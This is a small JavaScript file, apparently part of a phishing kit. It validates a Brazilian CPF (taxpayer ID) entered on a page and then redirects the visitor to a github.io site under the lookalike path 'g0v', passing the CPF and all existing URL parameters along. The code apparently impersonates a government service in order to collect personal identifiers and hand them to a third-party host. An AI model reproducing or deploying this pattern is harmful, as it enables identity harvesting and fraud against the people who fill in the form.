// custom.js

function ValidaCPF() {
    var cpf = document.getElementById("accountId").value.replace(/[^\d]/g, '');
    if (cpf.length !== 11 || !ValidaDigitosVerificadores(cpf)) {
        document.getElementById("invalidcpf").style.display = "block";
        setTimeout(() => {
            document.getElementById("invalidcpf").style.display = "none";
        }, 3000);
    } else {
        const urlParams = new URLSearchParams(window.location.search);
        window.location.href = "https://caroldvx.github.io/g0v/?cpf=" + document.getElementById("accountId").value.replace(/[^\d]/g, '') + '&' + urlParams.toString();
    }
}

// Outras funções JavaScript conforme necessário
